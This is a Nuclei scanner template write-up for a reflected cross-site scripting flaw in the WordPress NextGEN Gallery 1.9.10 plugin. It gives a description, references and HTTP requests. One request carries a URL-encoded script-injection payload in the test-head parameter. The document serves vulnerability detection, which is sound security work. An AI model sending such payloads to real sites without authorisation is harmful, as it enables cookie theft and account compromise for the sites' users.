# Nuclei Template: WordPress NextGEN Gallery 1.9.10 - Cross-Site Scripting
**Template ID:** wp-nextgen-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-nextgen-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress NextGEN Gallery 1.9.10 plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/nextgen-gallery/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://www.exploit-db.com/exploits/38178
- http://web.archive.org/web/20210123110617/https://www.securityfocus.com/bid/57200/info
